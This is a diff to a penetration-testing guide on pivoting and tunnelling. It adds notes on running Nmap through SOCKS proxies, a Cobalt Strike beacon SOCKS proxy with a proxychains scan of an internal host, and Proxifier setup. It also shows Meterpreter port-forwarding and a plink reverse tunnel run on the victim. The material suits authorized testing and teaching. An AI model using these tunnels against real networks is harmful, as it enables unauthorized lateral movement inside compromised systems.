@@ -23,6 +23,12 @@ _A **digital transformation** tailored to your organization is unique. It also c
 {% embed url="https://securityboat.in/contact-us" %}
 {% endhint %}
 
+## Nmap tip
+
+{% hint style="warning" %}
+**ICMP** and **SYN** scans cannot be tunnelled through socks proxies, so we must **disable ping discovery** (`-Pn`) and specify **TCP scans** (`-sT`) for this to work.
+{% endhint %}
+
 ## **Bash**
 
 **Host -> Jump -> InternalA -> InternalB**&#x20;
@@ -127,7 +133,7 @@ Local port --> Compromised host (active session) --> Third\_box:Port
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 
-### Port2hostnet (proxychains)
+### SOCKS
 
 ```bash
 background# meterpreter session
@@ -150,6 +156,20 @@ use auxiliary/server/socks_proxy
 set VERSION 4a
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
+```
+
+## Cobalt Strike
+
+### SOCKS proxy
+
+Open a port in the teamserver listening in all the interfaces that can be used to **route the traffic through the beacon**.
+
+```bash
+beacon> socks 1080
+[+] started SOCKS4a server on: 1080
+
+# Set port 1080 as proxy server in proxychains.conf
+proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ```
 
 ## reGeorg
@@ -304,6 +324,12 @@ As this binary will be executed in the victim and it is a ssh client, we need to
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
 ```
+
+## Proxify Windows GUI Apps
+
+You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).\
+In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
+In **Profile -> Proxification Rules** add the name of the program to proxify and the connections to the IPs you want to proxify.
 
 ## NTLM proxy bypass
 
